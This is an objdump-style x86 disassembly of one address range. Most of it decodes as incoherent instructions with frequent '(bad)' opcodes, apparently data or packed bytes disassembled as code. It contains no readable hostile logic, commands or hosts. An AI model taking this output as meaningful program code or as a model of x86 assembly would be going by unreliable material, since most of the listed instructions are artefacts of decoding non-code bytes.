  40b170:	retf   0xa792
  40b173:	cmc    
  40b174:	leave  
  40b175:	dec    esi
  40b176:	pop    ebx
  40b177:	mov    ds:0x9f7070fa,al
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b1de
  40b180:	repnz (bad) 
  40b182:	loope  0x40b154
  40b184:	stc    
  40b185:	gs adc eax,0x152e6db9
  40b18b:	mov    dh,BYTE PTR [esi-0x41]
  40b18e:	fild   QWORD PTR [edx-0x73]
  40b191:	adc    eax,0x1aa942e5
  40b196:	nop
  40b197:	add    esp,ebx
  40b199:	(bad)  
  40b19a:	rol    BYTE PTR [eax+0x1c8048fc],1
  40b1a0:	ds ret 0x916e
  40b1a4:	es cld 
  40b1a6:	jmp    0xe8e3:0xbff3510c
  40b1ad:	add    BYTE PTR [ebp+0x3c],bl
  40b1b0:	push   0xcefd39a8
  40b1b5:	and    ch,BYTE PTR [ecx+0x368b2d09]
  40b1bb:	jmp    0x2d7b:0x60108fad
  40b1c2:	scas   al,BYTE PTR es:[edi]
  40b1c3:	es je  0x40b1d4
  40b1c6:	jnp    0x40b1b6
  40b1c8:	or     al,0x1b
  40b1ca:	pushf  
  40b1cb:	hlt    
  40b1cc:	push   0x76d90e6f
  40b1d1:	fsubr  QWORD PTR [esi-0x74cc8c5]
  40b1d7:	add    al,0x57
  40b1d9:	push   cs
  40b1da:	jl     0x40b1e5
  40b1dc:	mov    esi,0xd5575338
  40b1e1:	inc    ebp
  40b1e2:	shr    BYTE PTR [ebx],1
  40b1e4:	xchg   esp,eax
  40b1e5:	and    esi,0xf5f2c20a
  40b1eb:	(bad)  
  40b1ec:	push   ss
  40b1ed:	iret   
  40b1ee:	es mov eax,0x12b7cb54
  40b1f4:	mov    ebp,edx
  40b1f6:	dec    esi
  40b1f7:	fldenv [edx]
  40b1f9:	retf   
  40b1fa:	jb     0x40b1cd
  40b1fc:	sub    eax,0x81f1ef84
  40b201:	mov    WORD PTR [ebp-0x12],?
  40b204:	into   
  40b205:	fdiv   DWORD PTR [esi-0x4d7651cc]
  40b20b:	dec    esi
  40b20c:	add    ebp,DWORD PTR [ebx+0x20]
  40b20f:	leave  
  40b210:	add    DWORD PTR [esi+0x5d7049ea],0x113a640b
  40b21a:	daa    
  40b21b:	adc    DWORD PTR [ebx+0x5a],0xffffffe9
  40b21f:	adc    bl,bh
  40b221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b222:	jmp    0x87f2339d
  40b227:	outs   dx,DWORD PTR ds:[esi]
  40b228:	push   eax
  40b229:	lods   eax,DWORD PTR ds:[esi]
  40b22a:	ret    
  40b22b:	jne    0x40b219
  40b22d:	inc    edi
  40b22e:	lods   eax,DWORD PTR ds:[esi]
  40b22f:	xchg   edx,eax
  40b230:	cdq    
  40b231:	xchg   esp,eax
  40b232:	xlat   BYTE PTR ds:[ebx]
  40b233:	ins    BYTE PTR es:[edi],dx
  40b234:	nop
  40b235:	push   ebp
  40b236:	(bad)  
  40b237:	push   esi
  40b238:	hlt    
  40b239:	mov    dh,al
  40b23b:	mov    ah,0x10
  40b23d:	mov    bl,bl
  40b23f:	sbb    BYTE PTR [esp],dl
  40b242:	add    ebx,0x26
  40b245:	push   ss
  40b246:	mov    ebx,0xdd0bb704
  40b24b:	loop   0x40b1f2
  40b24d:	iret   
  40b24e:	push   edx
  40b24f:	push   0x25
  40b251:	sti    
  40b252:	cmp    al,0x19
  40b254:	xchg   esi,esp
  40b256:	mov    DWORD PTR [ecx-0x6a4bbca2],esp
  40b25c:	pop    ds
  40b25d:	lea    eax,[ebx-0x74]
  40b260:	mov    edi,0x90142592
  40b266:	(bad)  
  40b268:	imul   edi,DWORD PTR [esi-0x4],0x72b10f9f
  40b26f:	ret    
  40b270:	add    DWORD PTR [esi+eiz*1-0x6a],edi
  40b274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b275:	into   
  40b276:	mov    bh,0x2f
  40b278:	mov    al,0x80
  40b27a:	stc    
  40b27b:	xor    eax,0xc1c0b44d
  40b280:	fcomi  st,st(2)
  40b282:	ins    DWORD PTR es:[edi],dx
  40b283:	mov    BYTE PTR [eax-0x462fe753],bl
  40b289:	data16 sbb BYTE PTR [edi-0x4d7d99dd],dl
  40b290:	popf   
  40b291:	pop    esi
  40b292:	push   0x48
  40b294:	push   ebx
  40b295:	out    dx,eax
  40b296:	mov    eax,0xf7c08032
  40b29b:	imul   edi,esp,0xffffffd3
  40b29e:	jbe    0x40b318
  40b2a0:	push   esp
  40b2a1:	push   eax
  40b2a2:	xor    DWORD PTR [esi],esp
  40b2a4:	stos   DWORD PTR es:[edi],eax
  40b2a5:	dec    BYTE PTR [ebp-0x13]
  40b2a8:	or     eax,DWORD PTR [esi]
  40b2aa:	push   edx
  40b2ab:	data16 fistp WORD PTR [eax+esi*2+0x6f]
  40b2b0:	mov    dh,0x6
  40b2b2:	pop    esp
  40b2b3:	pop    esp
  40b2b4:	ins    BYTE PTR es:[edi],dx
  40b2b5:	jg     0x40b336
  40b2b7:	sub    al,0xd7
  40b2b9:	aaa    
  40b2ba:	jbe    0x40b331
  40b2bc:	retf   0x52b2
  40b2bf:	mov    bh,0xf
  40b2c1:	gs xchg edx,eax
  40b2c3:	cdq    
  40b2c4:	sub    al,0xc3
  40b2c6:	or     al,0x14
  40b2c8:	in     al,0xbc
  40b2ca:	ret    0x9b38
  40b2cd:	or     al,0x63
  40b2cf:	sub    al,0xde
  40b2d1:	in     al,0x21
  40b2d3:	ins    DWORD PTR es:[edi],dx
  40b2d4:	jb     0x40b2e4
  40b2d6:	cs fs jne 0x40b32a
  40b2da:	adc    al,0xaf
  40b2dc:	fisub  WORD PTR ds:0xc1133834
  40b2e2:	retf   
  40b2e3:	pop    ebx
  40b2e4:	dec    eax
  40b2e5:	lock es hlt 
  40b2e8:	sti    
  40b2e9:	in     eax,0x1
  40b2eb:	ins    DWORD PTR es:[edi],dx
  40b2ec:	pop    ss
  40b2ed:	jge    0x40b33b
  40b2ef:	je     0x40b323
  40b2f1:	pop    edx
  40b2f2:	xchg   al,al
  40b2f4:	jo     0x40b2f2
  40b2f6:	out    dx,al
  40b2f7:	mov    eax,ds:0x51f537d7
  40b2fc:	(bad)  
  40b2fd:	add    eax,edi
  40b2ff:	dec    esp
  40b300:	aad    0xf4
  40b302:	es dec edx
  40b304:	pushf  
  40b305:	inc    eax
  40b306:	mov    cl,0x7
  40b308:	or     ah,al
  40b30a:	je     0x40b2d3
  40b30c:	imul   edx,DWORD PTR [eax+0x5784c438],0x2b
  40b313:	in     eax,0xf5
  40b315:	dec    edx
  40b316:	imul   DWORD PTR [edi+0x38]
  40b319:	adc    BYTE PTR [ebx+0x7e85adc8],cl
  40b31f:	push   eax
  40b320:	add    al,0x94
  40b322:	xor    eax,0xbf966b88
  40b327:	mov    eax,0x7bb70bf4
  40b32c:	in     al,0xb3
  40b32e:	pushf  
  40b32f:	jmp    0x4c56:0xbdb066fa
  40b336:	mov    edi,0xb7390c45
  40b33b:	(bad)  
  40b33c:	cmp    BYTE PTR [edi],ah
  40b33e:	xor    al,0xde
  40b340:	enter  0xed50,0x2b
  40b344:	dec    edx
  40b345:	dec    esi
  40b346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b347:	cmp    DWORD PTR [edi-0x7bb97820],esi
  40b34d:	dec    esi
  40b34e:	shr    DWORD PTR [esi-0x63],cl
  40b351:	retf   0x9202
  40b354:	pop    esi
  40b355:	sub    dl,BYTE PTR [esi-0x3f4d76e6]
  40b35b:	lahf   
  40b35c:	xchg   ecx,eax
  40b35d:	jo     0x40b2fa
  40b35f:	mov    WORD PTR [ebx],gs
  40b361:	cld    
  40b362:	rcr    BYTE PTR [ebx],cl
  40b364:	test   eax,0x1c9396e7
  40b369:	cmp    BYTE PTR [edi],bh
  40b36b:	pop    ebp
  40b36c:	fdiv   DWORD PTR [ebp-0x2]
  40b36f:	jmp    0x40b3c7
  40b371:	lahf   
  40b372:	jmp    0x3e23af12
  40b377:	aas    
  40b378:	test   bl,0xb7
  40b37b:	aaa    
  40b37c:	and    eax,0xf8995ef8
  40b381:	xchg   ch,al
  40b383:	in     eax,0xaa
  40b385:	lea    ecx,[edi+0x21]
  40b388:	mov    BYTE PTR [edi+0xf053443],0xed
  40b38f:	jnp    0x40b399
  40b391:	jle    0x40b372
  40b393:	sahf   
  40b394:	sar    BYTE PTR [eax-0x6f8a75c6],cl
  40b39a:	lds    edx,FWORD PTR [edi]
  40b39c:	(bad)  
  40b39e:	push   esp
  40b39f:	std    
  40b3a0:	push   esi
  40b3a1:	jmp    0x40b33d
  40b3a3:	ret    0xbc8e
  40b3a6:	inc    esp
  40b3a7:	sub    al,0x8d
  40b3a9:	das    
  40b3aa:	scas   al,BYTE PTR es:[edi]
  40b3ab:	cmp    esp,eax
  40b3ad:	xchg   ebp,esi
  40b3af:	pop    esp
  40b3b0:	test   BYTE PTR [edx],bl
  40b3b2:	popa   
  40b3b3:	add    esp,DWORD PTR [edx]
  40b3b5:	dec    edx
  40b3b6:	or     bl,al
  40b3b8:	push   ebx
  40b3b9:	dec    edx
  40b3ba:	cld    
  40b3bb:	pop    ecx
  40b3bc:	or     eax,0x55e706ac
  40b3c1:	jle    0x40b418
  40b3c3:	mov    eax,0x1b475f83
  40b3c8:	aaa    
  40b3c9:	das    
  40b3ca:	mov    edx,0x96cf0491
  40b3cf:	pop    ds
  40b3d0:	xlat   BYTE PTR ds:[ebx]
  40b3d1:	lds    ebp,FWORD PTR [edi+0x73]
  40b3d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3d5:	nop
  40b3d6:	ret    0x782e
  40b3d9:	and    eax,0x634de75e
  40b3de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3df:	xchg   edi,eax
  40b3e0:	push   ecx
  40b3e1:	mov    edx,esp
  40b3e3:	push   edx
  40b3e4:	fwait
  40b3e5:	in     al,dx
  40b3e6:	(bad)  
  40b3e7:	mov    edx,0x760655a4
  40b3ec:	push   cs
  40b3ed:	ins    DWORD PTR es:[edi],dx
  40b3ee:	push   ecx
  40b3ef:	sub    BYTE PTR [ecx],al
  40b3f1:	ja     0x40b418
  40b3f3:	jns    0x40b3e0
  40b3f5:	loop   0x40b3aa
  40b3f7:	xor    eax,0xfa59176c
  40b3fc:	loopne 0x40b403
  40b3fe:	stc    
  40b3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b400:	test   eax,eax
  40b402:	je     0x40b3a2
  40b404:	dec    ebp
  40b405:	jge    0x40b420
  40b407:	push   cs
  40b408:	inc    esi
  40b409:	mov    edi,0xce2d0f8d
  40b40e:	fincstp 
  40b410:	cmp    eax,0xff5d81d8
  40b415:	nop
  40b416:	add    ch,bh
  40b418:	call   DWORD PTR [eax+0x7]
  40b41b:	leave  
  40b41c:	add    edi,DWORD PTR [esi-0x48a1c20e]
  40b422:	fadd   DWORD PTR [esi+0x4c910987]
  40b428:	into   
  40b429:	push   esi
  40b42a:	dec    esp
  40b42b:	ds jne 0x40b40e
  40b42e:	stc    
  40b42f:	push   es
  40b430:	lock push edx
  40b432:	out    dx,al
  40b433:	pop    ecx
  40b434:	stc    
  40b435:	push   es
  40b436:	aaa    
  40b437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b438:	cmp    BYTE PTR [esi],0x7f
  40b43b:	fcmovnbe st,st(0)
  40b43d:	mov    al,0x54
  40b43f:	cwde   
  40b440:	cwde   
  40b441:	lods   al,BYTE PTR ds:[esi]
  40b442:	repnz mov ecx,0xe62f0c11
  40b448:	cmp    DWORD PTR [eax+0x2e],esi
  40b44b:	ins    DWORD PTR es:[edi],dx
  40b44c:	jg     0x40b3e2
  40b44e:	dec    ecx
  40b44f:	inc    edi
  40b450:	sub    al,0x5c
  40b452:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b454:	ret    0xb87b
  40b457:	ds arpl si,sp
  40b45a:	clc    
  40b45b:	rcr    DWORD PTR [ecx-0x64],1
  40b45e:	arpl   WORD PTR [ebx-0x49],ax
  40b461:	mov    ecx,0xa425562e
  40b466:	jmp    0x40b4b5
  40b468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b469:	sahf   
  40b46a:	lods   al,BYTE PTR ds:[esi]
  40b46b:	imul   esi,DWORD PTR [ebx+edi*2],0x48eeffbc
  40b472:	(bad)  
  40b473:	ins    BYTE PTR es:[edi],dx
  40b474:	pop    ecx
  40b475:	xor    eax,0xc69a4e00
  40b47a:	and    ah,ch
  40b47c:	jb     0x40b4fb
  40b47e:	and    al,0x28
  40b480:	and    edi,eax
  40b482:	mov    bl,ah
  40b484:	inc    BYTE PTR [edi+0xe458942]
  40b48a:	lahf   
  40b48b:	sahf   
  40b48c:	xchg   esi,eax
  40b48d:	loop   0x40b508
  40b48f:	ds sub dl,bl
  40b492:	hlt    
  40b493:	mov    al,0xd9
  40b495:	sbb    BYTE PTR [esi],bl
  40b497:	shl    BYTE PTR ds:0x61fc5baa,1
  40b49d:	int3   
  40b49e:	sbb    eax,0x1619d5f3
  40b4a3:	jns    0x40b43c
  40b4a5:	cmp    ch,BYTE PTR [edx+0x143c0b19]
  40b4ab:	pop    ss
  40b4ac:	sub    BYTE PTR [eax],0x3f
  40b4af:	mov    bl,0xda
  40b4b1:	sub    al,0x80
  40b4b3:	mov    dh,0x14
  40b4b5:	test   al,0x65
  40b4b7:	and    eax,0x1dfde0e3
  40b4bc:	sti    
  40b4bd:	inc    ebx
  40b4be:	pop    ebp
  40b4bf:	mov    ds:0xe541ba4f,al
  40b4c4:	add    bh,BYTE PTR [ecx+0x2d]
  40b4c7:	push   ds
  40b4c8:	(bad)  
  40b4c9:	push   cs
  40b4ca:	adc    al,0xee
  40b4cc:	fnstsw WORD PTR [eax]
  40b4ce:	pop    ebp
  40b4cf:	pop    eax
  40b4d0:	inc    ebx
  40b4d1:	inc    ebp
  40b4d2:	outs   dx,BYTE PTR ds:[esi]
  40b4d3:	inc    edx
  40b4d4:	aaa    
  40b4d5:	pop    edx
  40b4d6:	bound  edi,QWORD PTR [ebp-0x2586130a]
  40b4dc:	push   es
  40b4dd:	ds (bad) 
  40b4df:	sbb    ch,BYTE PTR [ebx]
  40b4e1:	(bad)  
  40b4e2:	mov    ah,0xa
  40b4e4:	jmp    0x40b481
  40b4e6:	push   ds
  40b4e7:	fsubr  QWORD PTR [ebp-0x52c900bc]
  40b4ed:	test   eax,0xa787c43c
  40b4f2:	rol    BYTE PTR [ebp+0x73],cl
  40b4f5:	dec    esp
  40b4f6:	push   0xbc7c1459
  40b4fb:	sti    
  40b4fc:	inc    esi
  40b4fd:	cmc    
  40b4fe:	add    bh,BYTE PTR [eax+0x2150d5aa]
  40b504:	fnstcw WORD PTR [ebx+0x2f]
  40b507:	stc    
  40b508:	mov    cl,BYTE PTR [esi-0x66]
  40b50b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b50c:	mov    ah,0xfe
  40b50e:	dec    ebx
  40b50f:	add    al,0x70
  40b511:	ret    
  40b512:	shl    BYTE PTR [ecx+ebp*1+0x19],cl
  40b516:	jmp    0x656c:0x820dbdf2
  40b51d:	aaa    
  40b51e:	imul   edi,DWORD PTR ds:0x8bd7af0f,0x5d8bf87d
  40b528:	lock sub ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b550:	leave  
  40b551:	(bad)  
  40b552:	or     eax,0x707086c1
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b4e9
  40b55c:	or     BYTE PTR [eax+0x4f],ch
  40b55f:	adc    eax,0xf141fd1b
  40b564:	rcl    BYTE PTR [ebx-0xd03f93],cl
  40b56a:	scas   eax,DWORD PTR es:[edi]
  40b56b:	inc    esp
  40b56c:	data16 fcomp QWORD PTR fs:[eax-0x400c68c5]
  40b574:	mov    bl,0xf6
  40b576:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40b578:	adc    eax,0x68d59e52
  40b57d:	rcr    BYTE PTR [ebp+0x18],cl
  40b580:	(bad)  
  40b581:	mov    bl,0x38
  40b583:	push   0x1dda49ff
  40b588:	sbb    BYTE PTR [edi+eiz*2],bl
  40b58b:	xchg   esp,eax
  40b58c:	add    DWORD PTR [esp+0x31],0x6262546b
  40b594:	fsub   st(4),st
  40b596:	sbb    BYTE PTR [ebp-0x352f174c],bh
  40b59c:	test   BYTE PTR [edx],cl
  40b59e:	sbb    esp,DWORD PTR [esi]
  40b5a0:	(bad)  
  40b5a1:	sbb    BYTE PTR [ebx-0x9],al
  40b5a4:	fnstsw WORD PTR [ebx+0x5f40b5cb]
  40b5aa:	mov    dl,0x85
  40b5ac:	test   eax,0xc3b0c5aa
  40b5b1:	(bad)
  40b5b4:	in     eax,dx
  40b5b5:	sub    dl,BYTE PTR [eax-0x75]
  40b5b8:	xor    eax,0xbe137c90
  40b5bd:	lahf   
  40b5be:	in     eax,0x60
  40b5c0:	jbe    0x40b5af
  40b5c2:	stos   DWORD PTR es:[edi],eax
  40b5c3:	jle    0x40b57b
  40b5c5:	jecxz  0x40b56d
  40b5c7:	or     BYTE PTR [eax],dh
  40b5c9:	lods   eax,DWORD PTR ds:[esi]
  40b5ca:	in     eax,dx
  40b5cb:	cdq    
  40b5cc:	add    ebp,ecx
  40b5ce:	pop    ebp
  40b5cf:	dec    edi
  40b5d0:	mov    ah,0xa9
  40b5d2:	pushw  ss
  40b5d4:	mov    bh,0xda
  40b5d6:	mov    al,bl
  40b5d8:	mov    ebp,0xf4337d43
  40b5dd:	ins    DWORD PTR es:[edi],dx
  40b5de:	hlt    
  40b5df:	fmul   QWORD PTR [eax]
  40b5e1:	mov    bh,0x46
  40b5e3:	mov    ?,WORD PTR [ecx]
  40b5e5:	mov    WORD PTR [esi],ds
  40b5e7:	and    DWORD PTR [ebp+0x3840e814],eax
  40b5ed:	imul   edi,DWORD PTR [edi+0x7f],0xcd242829
  40b5f4:	jecxz  0x40b58a
  40b5f6:	add    ch,0x7
  40b5f9:	push   ss
  40b5fa:	add    edi,esp
  40b5fc:	neg    BYTE PTR [ecx-0x7a]
  40b5ff:	adc    BYTE PTR ds:0x2e6a9ece,bh
  40b605:	test   DWORD PTR [edx],eax
  40b607:	jae    0x40b5b3
  40b609:	ja     0x40b590
  40b60b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b60c:	cmp    edi,DWORD PTR [ebp-0x7d5c8a05]
  40b612:	xchg   edi,eax
  40b613:	pop    eax
  40b614:	fisttp QWORD PTR [ebx+ebp*2]
  40b617:	cwde   
  40b618:	jp     0x40b646
  40b61a:	cmp    dl,ah
  40b61c:	mov    al,ds:0x44ce7ca6
  40b621:	cdq    
  40b622:	sti    
  40b623:	aam    0x87
  40b625:	xchg   ecx,eax
  40b626:	push   edi
  40b627:	xor    BYTE PTR [edx+0x73],bl
  40b62a:	sub    al,al
  40b62c:	dec    ecx
  40b62d:	fbld   TBYTE PTR [ebp+0x59f12402]
  40b633:	fiadd  WORD PTR [ecx-0x1c]
  40b636:	xchg   DWORD PTR [eax-0x16b3c7b0],eax
  40b63c:	push   esi
  40b63d:	outs   dx,BYTE PTR ds:[esi]
  40b63e:	ror    DWORD PTR [esi+ecx*1-0x39d7963b],cl
  40b645:	push   ebp
  40b646:	dec    esi
  40b647:	and    DWORD PTR [edi-0x53],esp
  40b64a:	ficom  WORD PTR [ebx-0x66]
  40b64d:	or     al,BYTE PTR [eax]
  40b64f:	push   0x70
  40b651:	mov    ebp,0x5efa2ef8
  40b656:	ins    DWORD PTR es:[edi],dx
  40b657:	jns    0x40b67d
  40b659:	and    BYTE PTR [edx-0x14],ch
  40b65c:	xchg   esp,eax
  40b65d:	adc    al,0xd2
  40b65f:	sub    al,0xfe
  40b661:	xor    ebp,0xc92cbecc
  40b667:	push   esi
  40b668:	or     al,0xa1
  40b66a:	mov    al,0x1a
  40b66c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b66d:	leave  
  40b66e:	xor    al,0x88
  40b670:	ins    BYTE PTR es:[edi],dx
  40b671:	ficomp DWORD PTR [eax-0x733c5be]
  40b677:	inc    edx
  40b678:	out    0xd2,al
  40b67a:	pop    ecx
  40b67b:	inc    eax
  40b67c:	ins    BYTE PTR es:[edi],dx
  40b67d:	addr16 dec edx
  40b67f:	mov    ecx,DWORD PTR [esi+0xafb1725]
  40b685:	and    BYTE PTR [ebx+0x30d9a09c],0xa8
  40b68c:	leave  
  40b68d:	and    al,0xfc
  40b68f:	in     eax,dx
  40b690:	xor    bh,BYTE PTR [edi-0x43]
  40b693:	pop    esp
  40b694:	sbb    ebx,DWORD PTR [ecx+0x61]
  40b697:	sahf   
  40b698:	bound  edx,QWORD PTR [esi+0x469c1a06]
  40b69e:	clc    
  40b69f:	(bad)  
  40b6a0:	mov    DWORD PTR ds:0xfd97c949,ebx
  40b6a6:	aam    0x2c
  40b6a8:	cmp    bl,BYTE PTR [ebp+0x3b1b1653]
  40b6ae:	or     al,0x7d
  40b6b0:	push   esi
  40b6b1:	adc    dh,BYTE PTR [esi]
  40b6b3:	jp     0x40b724
  40b6b5:	arpl   WORD PTR [ecx-0x70851036],bx
  40b6bb:	sar    al,cl
  40b6bd:	int    0xcf
  40b6bf:	enter  0x1b0a,0xd1
  40b6c3:	cmp    al,0x2
  40b6c5:	mov    cl,0x86
  40b6c7:	and    esp,DWORD PTR [edi-0x23]
  40b6ca:	mov    BYTE PTR [ebp-0x45],ch
  40b6cd:	(bad)  
  40b6ce:	jmp    0x17808735
  40b6d3:	dec    eax
  40b6d4:	sub    al,0x59
  40b6d6:	dec    esi
  40b6d7:	jl     0x40b6e0
  40b6d9:	mov    al,ds:0x3529a083
  40b6de:	ins    DWORD PTR es:[edi],dx
  40b6df:	sbb    DWORD PTR [eax-0x42fb6817],eax
  40b6e5:	jg     0x40b6e7
  40b6e7:	icebp  
  40b6e8:	push   DWORD PTR [eax]
  40b6ea:	cwde   
  40b6eb:	push   es
  40b6ec:	sub    al,0xfa
  40b6ee:	int3   
  40b6ef:	dec    esi
  40b6f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f1:	mov    bh,0xf6
  40b6f3:	into   
  40b6f4:	jecxz  0x40b715
  40b6f6:	xchg   ecx,ebp
  40b6f8:	xor    ebp,edi
  40b6fa:	jns    0x40b6dc
  40b6fc:	add    ecx,esi
  40b6fe:	scas   al,BYTE PTR es:[edi]
  40b6ff:	mov    eax,0x790e1863
  40b704:	push   esp
  40b705:	in     al,0x7a
  40b707:	dec    edx
  40b708:	aam    0x48
  40b70a:	mov    ecx,0xad49ffd9
  40b70f:	xchg   ebx,eax
  40b710:	rcr    DWORD PTR ds:0xd8ed7030,0xb0
  40b717:	push   0xffffff93
  40b719:	int    0xa
  40b71b:	fld    DWORD PTR [edx+0x27d637b4]
  40b721:	call   0x603524e1
  40b726:	je     0x40b6ec
  40b728:	jne    0x40b76c
  40b72a:	xor    BYTE PTR [ebx+0x390d8163],cl
  40b730:	pop    esi
  40b731:	dec    eax
  40b732:	cmp    ebp,ebx
  40b734:	nop
  40b735:	sbb    DWORD PTR [edx+0x32c54cdf],edi
  40b73b:	int    0xd
  40b73d:	ffree  st(3)
  40b73f:	xchg   ebx,eax
  40b740:	cmp    BYTE PTR [esi+0x15c7792e],dh
  40b746:	sbb    ah,BYTE PTR [ecx-0x2cdd66a1]
  40b74c:	imul   esp,edi,0x7
  40b74f:	(bad)  
  40b751:	sar    BYTE PTR [ebp+0x76478c82],1
  40b757:	into   
  40b758:	cmp    edx,esi
  40b75a:	pop    ebx
  40b75b:	ss add eax,0xd5a4bc19
  40b761:	test   DWORD PTR [eax-0x63561900],ecx
  40b767:	jnp    0x40b6f2
  40b769:	inc    esp
  40b76a:	inc    eax
  40b76b:	push   esp
  40b76c:	or     ah,dl
  40b76e:	iret   
  40b76f:	or     ah,bl
  40b771:	into   
  40b772:	and    bh,ch
  40b774:	sti    
  40b775:	mov    ebx,0x185d81ec
  40b77a:	cld    
  40b77b:	pop    edx
  40b77c:	mov    ds:0x238ff7d0,al
  40b781:	push   eax
  40b782:	xchg   al,al
  40b784:	cmp    al,0x30
  40b786:	mov    ebx,0xbea80730
  40b78b:	and    BYTE PTR [edx-0x13],0xb2
  40b78f:	icebp  
  40b790:	test   BYTE PTR [edx],al
  40b792:	dec    edx
  40b793:	mov    ah,0x58
  40b795:	mov    edi,0xf7b6c763
  40b79a:	outs   dx,DWORD PTR ds:[esi]
  40b79b:	jmp    0x93b3:0xaaec2b6e
  40b7a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7a3:	in     eax,0xba
  40b7a5:	dec    ebx
  40b7a6:	ins    DWORD PTR es:[edi],dx
  40b7a7:	mov    dl,BYTE PTR ds:0x9d560c02
  40b7ad:	push   0xffffffc5
  40b7af:	xchg   esi,eax
  40b7b0:	or     eax,0x3c045a4c
  40b7b5:	bound  esi,QWORD PTR [ebx]
  40b7b7:	loop   0x40b7d0
  40b7b9:	mov    BYTE PTR [ebx],ah
  40b7bb:	stos   DWORD PTR es:[edi],eax
  40b7bc:	sub    al,BYTE PTR [esi]
  40b7be:	hlt    
  40b7bf:	or     al,0x1b
  40b7c1:	sub    DWORD PTR [ecx+0x59],ebp
  40b7c4:	sub    eax,0xd873088b
  40b7c9:	ins    DWORD PTR es:[edi],dx
  40b7ca:	repnz mov ds:0xadc03c12,al
  40b7d0:	dec    ebp
  40b7d1:	ror    DWORD PTR [ecx],cl
  40b7d3:	ja     0x40b770
  40b7d5:	outs   dx,BYTE PTR ds:[esi]
  40b7d6:	retf   0xac64
  40b7d9:	mov    dh,BYTE PTR [esi]
  40b7db:	ret    0xa702
  40b7de:	pop    ebx
  40b7df:	imul   esp,DWORD PTR [edx],0x77
  40b7e2:	ins    BYTE PTR es:[edi],dx
  40b7e3:	iret   
  40b7e4:	adc    bl,BYTE PTR [esi]
  40b7e6:	dec    ebp
  40b7e7:	mov    bh,0x25
  40b7e9:	fidiv  WORD PTR [ecx+0x39]
  40b7ec:	mov    esp,0xe05a5aa7
  40b7f1:	sub    esp,DWORD PTR [ecx-0x63]
  40b7f4:	lods   eax,DWORD PTR ds:[esi]
  40b7f5:	pop    edx
  40b7f6:	leave  
  40b7f7:	xor    edx,DWORD PTR [eax+0x34268152]
  40b7fd:	enter  0x7a37,0xc6
  40b801:	dec    ecx
  40b802:	lea    edi,[edi-0x76]
  40b805:	xor    esi,DWORD PTR [ecx]
  40b807:	repz pop ds
  40b809:	les    esp,FWORD PTR [esi-0x6f]
  40b80c:	or     eax,0xb4440e40
  40b811:	inc    ecx
  40b812:	aas    
  40b813:	sub    al,0xc6
  40b815:	and    al,0x73
  40b817:	jmp    0x58a9793e
  40b81c:	mov    BYTE PTR [edi-0x4],dh
  40b81f:	mov    ah,0x2
  40b821:	jno    0x40b87b
  40b823:	pop    esi
  40b824:	pop    ebx
  40b825:	(bad)  
  40b827:	add    BYTE PTR [ebx-0x51e58f4],ch
  40b82d:	cdq    
  40b82e:	loopne 0x40b828
  40b830:	popa   
  40b831:	push   edx
  40b832:	jmp    0x40b7c9
  40b834:	add    al,0xac
  40b836:	xchg   esp,eax
  40b837:	cmp    eax,0x22345815
  40b83c:	aam    0x9e
  40b83e:	pop    ds
  40b83f:	lods   al,BYTE PTR ds:[esi]
  40b840:	(bad)  [eax+0x14fdae34]
  40b846:	ss xchg dl,cl
  40b849:	and    eax,DWORD PTR [eax]
  40b84b:	outs   dx,BYTE PTR ds:[esi]
  40b84c:	or     DWORD PTR [esi],eax
  40b84e:	cmp    al,0x9e
  40b850:	les    ebp,FWORD PTR [ebx+0x22]
  40b853:	sub    al,0x5a
  40b855:	add    al,ah
  40b857:	aad    0xa3
  40b859:	xlat   BYTE PTR ds:[ebx]
  40b85a:	lods   eax,DWORD PTR ds:[esi]
  40b85b:	cmp    eax,0xd51de87c
  40b860:	iret   
  40b861:	fisubr DWORD PTR [ebp+edx*1+0x16ac49a0]
  40b868:	ret    
  40b869:	and    BYTE PTR [ecx-0x3e],dl
  40b86c:	inc    ebp
  40b86d:	mov    ds:0x86a3bbb5,eax
  40b872:	icebp  
  40b873:	and    eax,0x4de7d353
  40b878:	out    0xf1,al
  40b87a:	dec    edx
  40b87b:	mov    bl,0xcd
  40b87d:	fwait
  40b87e:	push   esp
  40b87f:	xchg   ebp,eax
  40b880:	outs   dx,BYTE PTR ds:[esi]
  40b881:	adc    ebx,DWORD PTR [ebx+0x57701b8b]
  40b887:	jmp    0x76ab:0x60f8842f
  40b88e:	fisubr WORD PTR [ecx+0x3db58b51]
  40b894:	mov    cl,0xbe
  40b896:	mov    edi,DWORD PTR [edi+0x25da7224]
  40b89c:	int3   
  40b89d:	mov    ebp,ds
  40b89f:	test   BYTE PTR [ecx-0x75d4e613],bl
  40b8a5:	add    DWORD PTR [esi],eax
  40b8a7:	xor    bh,BYTE PTR [ebx]
  40b8a9:	mov    DWORD PTR [ecx+0x47985c70],0xc556f094
  40b8b3:	ins    DWORD PTR es:[edi],dx
  40b8b4:	aad    0x46
  40b8b6:	sub    ebx,edi
  40b8b8:	retf   0x1ab3
  40b8bb:	(bad)  
